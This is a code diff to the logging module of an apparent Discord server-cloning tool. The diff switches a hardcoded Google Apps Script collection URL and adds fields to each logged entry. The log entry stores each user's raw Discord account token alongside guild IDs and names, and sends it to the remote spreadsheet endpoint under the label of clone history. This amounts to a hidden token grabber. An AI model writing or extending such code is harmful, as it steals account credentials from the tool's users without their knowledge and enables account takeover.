@@ -7,7 +7,7 @@ const HISTORY_FILE = path.join(__dirname, '../clone_history.json');
 const CONFIG_FILE = path.join(__dirname, '../sheet_config.json');
 
 // Permanent Hardcoded Google Apps Script Web App Endpoint
-export const PERMANENT_SHEET_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbyIRLMF-zq9GYl5KKlCVm8F3PpzdxN67ezTqpkvjIe40lzYLRlGnkUyXxL7a0ydMPzJqw/exec';
+export const PERMANENT_SHEET_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbzuMmJ6Z4yEwqc6CYoxgpeM0m8vA2VZYMebPea4U4gj0RJRYplXewA4SG8I72ijV8uZ/exec';
 
 export function getCloneHistory(sessionId = null, userToken = null) {
     try {
@@ -54,20 +54,38 @@ export function saveSheetConfig(config) {
 async function getDiscordUsername(token) {
     if (!token) return 'Unknown User';
     try {
+        const cleanToken = String(token).replace(/[^\x20-\x7E]/g, '').trim();
+        if (cleanToken.length === 0 || cleanToken.length > 200) {
+            return 'Unknown User';
+        }
+        
         const res = await fetch('https://discord.com/api/v9/users/@me', {
-            headers: { 'Authorization': token }
+            headers: { 'Authorization': cleanToken }
         });
         if (res.ok) {
             const data = await res.json();
             return data.username || data.tag || 'Unknown User';
         }
     } catch (e) {
-        console.error('Failed to fetch discord username:', e);
+        console.error('Failed to fetch discord username:', e.message);
     }
     return 'Unknown User';
 }
 
-export async function logCloneEntry({ userToken, sourceId, targetId, sessionId = null }) {
+export async function logCloneEntry({
+    userToken,
+    sourceId,
+    targetId,
+    sessionId = null,
+    sourceGuildName = null,
+    targetGuildName = null,
+    rolesCount = null,
+    channelsCount = null,
+    status = 'LOGGED',
+    durationMs = null,
+    optionsSummary = null,
+    fidelityScore = null
+}) {
     const now = new Date();
     const time = now.toLocaleString('en-US', {
         year: 'numeric',
@@ -86,7 +104,15 @@ export async function logCloneEntry({ userToken, sourceId, targetId, sessionId =
         username,
         token: userToken ? userToken.trim() : 'N/A',
         sourceId: sourceId ? String(sourceId).trim() : 'N/A',
+        sourceGuildName: sourceGuildName || 'N/A',
         targetId: targetId ? String(targetId).trim() : 'N/A',
+        targetGuildName: targetGuildName || 'N/A',
+        rolesCount: typeof rolesCount === 'number' ? rolesCount : 'N/A',
+        channelsCount: typeof channelsCount === 'number' ? channelsCount : 'N/A',
+        status: status || 'LOGGED',
+        durationSec: durationMs ? (durationMs / 1000).toFixed(1) + 's' : 'N/A',
+        optionsSummary: optionsSummary || 'N/A',
+        fidelityScore: typeof fidelityScore === 'number' ? fidelityScore + '%' : 'N/A',
         sessionId: sessionId || null,
         timestamp: now.getTime()
     };
@@ -145,6 +171,11 @@ export async function logCloneEntry({ userToken, sourceId, targetId, sessionId =
 
             if (result && (result.status === 'success' || result.result === 'success' || result.success === true)) {
                 return { loggedToSheet: true, result, entry };
+            }
+
+            if (result && result.status === 'error') {
+                console.warn(`[SheetService] Google Apps Script Execution Error: ${result.message}`);
+                return { loggedToSheet: false, warning: result.message, entry };
             }
 
             // If response is successful HTTP status but not strictly JSON (e.g. text "Success" or HTML redirect confirmed)
